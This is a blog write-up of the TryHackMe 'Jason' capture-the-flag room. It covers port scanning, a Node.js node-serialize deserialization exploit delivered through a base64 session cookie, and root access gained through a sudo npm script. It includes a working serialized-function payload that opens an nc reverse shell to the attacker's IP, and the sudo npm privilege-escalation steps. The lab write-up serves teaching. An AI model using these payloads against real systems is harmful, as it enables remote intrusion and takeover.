---
layout: post
title: TryHackMe Walkthrough - Jason
date: 2022-02-11
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Easy
permalink: /2022/02/THM/Jason
img: 2022/02/Jason/Jason.png
---

This was a fun room where I had to exploit a Node.js deserialization vulnerability to gain access to a server. And then use sudo to get root. It took me some time to get the first code execution. But once I was able to run code on the server, I got a shell and root pretty quickly.


* Room: Jason
* Difficulty: Easy
* URL: [https://tryhackme.com/room/jason](https://tryhackme.com/room/jason)
* Author: [elbee](https://tryhackme.com/p/elbee)

```
We are Horror LLC, we specialize in horror, but one of the scarier aspects of our company is our front-end webserver. We can't launch our site in its current state and our level of concern regarding our cybersecurity is growing exponentially. We ask that you perform a thorough penetration test and try to compromise the root account. There are no rules for this engagement. Good luck!
```

## Enumeration

I started to room by looking for opened ports.

```bash
$ rustscan -a target -- -A  | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.225.67:22
Open 10.10.225.67:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-11 13:01 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
...
Scanning 2 services on target (10.10.225.67)
Completed Service scan at 13:01, 24.78s elapsed (2 services on 1 host)
...
Nmap scan report for target (10.10.225.67)
Host is up, received syn-ack (0.24s latency).
Scanned at 2022-02-11 13:01:27 EST for 32s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 5b:2d:9d:60:a7:45:de:7a:99:20:3e:42:94:ce:19:3c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEav+HAGw7xuVSR7QKeKvPc2ZpLfgIJ2azj8wt8S3VdC0yPI5cgFTwrdyZ/b9nHwZb2ibA2Ld12zn4zObnoRLU05emZ0qSpyssEN6+xF2E9SSbe9o79UuJX7KoCAc4oKHdL6vme9Gt1NpmL7UVXaK8LG0wMJ0PAi90NPSp6yCqX+Zh3ox5/ozOw6J0fVWJhq+Op
Mq3uRdh4C4XQF5ZAN+Yf9uGy5er+VOCOt2Gio2Y+4O2VmQa+d16qJXziOV3tCwronfd8C2FXvbGWNjKnEpn7qmf5TFW7DmOs6lbvhNSqNImKHYPKeMJHDj/0MyjXMHrmYSMvQ/jHsdi1e8wUz4tIOkjrVkEy1BF6rJ20e0mdsJOnk4CrGqbNCvPoCCV0Sn4+IeOsDTqmXjzI6oVZZ/mEJM0p+AxC+a8NUU7IRtDOXQH
9bl2/g5N0n3UfpGjz+gmQxQMhcziZobRVUY8b+6TneDi4WLD889XWh0kemP8srXb/BR/DUsCvXJvAZ1gDbU=
|   256 bf:32:78:01:83:af:78:5e:e7:fe:9c:83:4a:7d:aa:6b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWImj6zzJJnO+2iTNXciJVkpCVcDC82aeGnvA3GVC4G1J7mwk1TYrRemrCBlwhm+BUzvs0q2qKk/9VCh1+kKlA=
|   256 12:ab:13:80:e5:ad:73:07:c8:48:d5:ca:7c:7d:e0:af (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEIOgTDXXq96o6fNCrn3mQ8JpGFHhx6AtZGEOG4Z+oF
80/tcp open  http    syn-ack
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Content-Type: text/html
...
|_http-title: Horror LLC
|_http-favicon: Unknown favicon MD5: 8FCEA7DE73B9ED47DE799DB3AE6363A8
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=2/11%Time=6206A47E%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,E4B,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/html\r\nDat
SF:e:\x20Fri,\x2011\x20Feb\x202022\x2018:01:37\x20GMT\r\nConnection:\x20cl
SF:ose\r\n\r\n<html><head>\n<title>Horror\x20LLC</title>\n<style>\n\x20\x2

...

Nmap done: 1 IP address (1 host up) scanned in 33.85 seconds
```

The server had two opened ports:
* 22 - SSH
* 80 - HTTP

## Web Site

I loaded the web site in my browser.

![Web Site](/assets/images/2022/02/Jason/MainSite.png "Web Site")

The site was simple. Just one text box to enter an email address to signup for a newsletter.

I looked at the page source and found the JavaScript function that posted the email to the server.

```js
<script>
    document.getElementById("signup").addEventListener("click", function() {
    var date = new Date();
    date.setTime(date.getTime()+(-1*24*60*60*1000));
    var expires = "; expires="+date.toGMTString();
    document.cookie = "session=foobar"+expires+"; path=/";
    const Http = new XMLHttpRequest();
    console.log(location);
    const url=window.location.href+"?email="+document.getElementById("fname").value;
    Http.open("POST", url);
    Http.send();
    setTimeout(function() {
        window.location.reload();
    }, 500);
    });
</script>
```

This code remove any session cookie by setting it to `foobar` with an expiration date in the past. Then it sends a POST request with the entered email in the URL. And reload the page after 500 milliseconds.

I tried posting an email address, the server responded with a session cookie.

```
Set-Cookie: session=eyJlbWFpbCI6ImVtYWlsQHRlc3QuY29tIn0=;
```
The cookie value was the provided email in JSON that was base64 encoded.

```bash
$ echo -n eyJlbWFpbCI6ImVtYWlsQHRlc3QuY29tIn0= | base64 -d
{"email":"email@test.com"}
```
I tried sending some other values in the POST request. But they were not sent back in the JSON.

I tried to fuzz the URL to find other endpoint. It did not find anything.

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 355 -t10 "http://target/FUZZ"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://target/FUZZ
Total requests: 20469

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

Total time: 500.3895
Processed Requests: 20469
Filtered Requests: 20469
Requests/sec.: 40.90613
```

Same thing when I tried to fuzz the parameters.

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 355 -t10 "http://target.thm?FUZZ=1"
```

## Remote Code Execution

I was wondering why the code was clearing the cookie. I used the developer tools of the browser to set the session cookie to the value that was returned when posting an email address. I reloaded the page, the email address was reflected back.

![Email Address](/assets/images/2022/02/Jason/EmailDisplayed.png "Email Address")

I looked for ways to exploit this, hopping that if I send code it might be executed. I tried multiple payloads, some with calls to `eval()`. Nothing worked.

```
{"email":"require('child_process').exec('nc 10.13.3.36 4444');"}
{"email":"eval(1+1)","command":"ls","cmd":"ls"}
```

I then searched for ways to exploit Node.js JSON parsing. That's when I found [a post about exploitng Node.js deserialization](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf).


I used a slightly modified version of the code from the post to see if my code will be executed.

```bash
cat test.js
var y = {
    email: function(){
            return 1;
    },
}
var serialize = require('node-serialize');
console.log(serialize.serialize(y));

node test.js
{"email":"_$$ND_FUNC$$_function(){\n\t    return 1;\n    }"}
```

I base64 encoded the output, then used Burp Repeater to send it as my session cookie.
> We'll keep you updated at: function(){

The code did not get executed. I added `()` at the end of the function definition to get it executed when it got deserialized. And this time it worked.

```
{"email":"_$$ND_FUNC$$_function(){\n\t    return 1;\n    }()"}
```

> We'll keep you updated at: 1

Now that I knew I could get remote code execution, I started a netcat listener on my machine.
```bash
$ nc -lvnp 4444
```

I modified the script to open a reverse shell.

```bash
$ cat test.js
var y = {
    email: function(){
        require('child_process').exec('mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg');
            return 1;
    },
}
var serialize = require('node-serialize');
console.log(serialize.serialize(y));

$ node test.js | sed 's/}"/}()"/g' | base64 -w0
eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe1xuICAgICAgICByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnbWtmaWZvIC90bXAva2lyeGhiZzsgbmMgMTAuMTMuMy4zNiA0NDQ0IDA8L3RtcC9raXJ4aGJnIHwgL2Jpbi9zaCA+L3RtcC9raXJ4aGJnIDI+JjE7IHJtIC90bXAva2lyK
```
I sent that payload as the session cookie. And I got a hit on my netcat listener.

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.225.67 46852
whoami
dylan
```

I stabilized my shell to make it easier to work in it. 
```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
# CTRL-z
$ stty raw -echo;fg
```

And I got the first flag. 

```bash
dylan@jason:/opt/webapp$ cd
dylan@jason:~$ ls
user.txt
dylan@jason:~$ cat user.txt
REDACTED
```

## Privilege Escalation

The first thing I always do on a box, is check if the current user can run sudo.

```bash
$ sudo -l
Matching Defaults entries for dylan on jason:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
```

I was able to run `npm` as any user, without a password. I could also pass npm any parameters I wanted. Knowing that npm can be used to run scripts, that was very interesting. 

I thought about looking on [GTFOBins](https://gtfobins.github.io/), but I was pretty sure I could do it without help. So I gave it a try.

I ran `npm init` to get a valid package.json file. 

```bash
dylan@jason:~$ mkdir test

dylan@jason:~$ cd test/

dylan@jason:~/test$ npm init
This utility will walk you through creating a package.json file.
It only covers the most common items, and tries to guess sensible defaults.

See `npm help json` for definitive documentation on these fields
and exactly what they do.

Use `npm install <pkg>` afterwards to install a package and
save it as a dependency in the package.json file.

Press ^C at any time to quit.
package name: (test)
version: (1.0.0)
description:
entry point: (index.js)
test command:
git repository:
keywords:
author:
license: (ISC)
About to write to /home/dylan/test/package.json:

{
  "name": "test",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "",
  "license": "ISC"
}


Is this OK? (yes)
```

I modified the generated file to add a new script that would just run `su`. 

```bash
dylan@jason:~/test$ cat package.json
{
  "name": "test",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "root": "su -"
  },
  "author": "",
  "license": "ISC"
}
```

Then I used npm to execute that command as root and get the privilege escalation. 

```bash
dylan@jason:~/test$ sudo npm run root

> test@1.0.0 root /home/dylan/test
> su -

root@jason:~# whoami
root

root@jason:~# cd

root@jason:~# ls
root.txt

root@jason:~# cat root.txt
REDACTED
```

And that was it. I spent more time getting the first code execution, then on the rest of the room. The vulnerability is pretty scary. But calling `unseserialize` on data that comes from the user is a bad idea.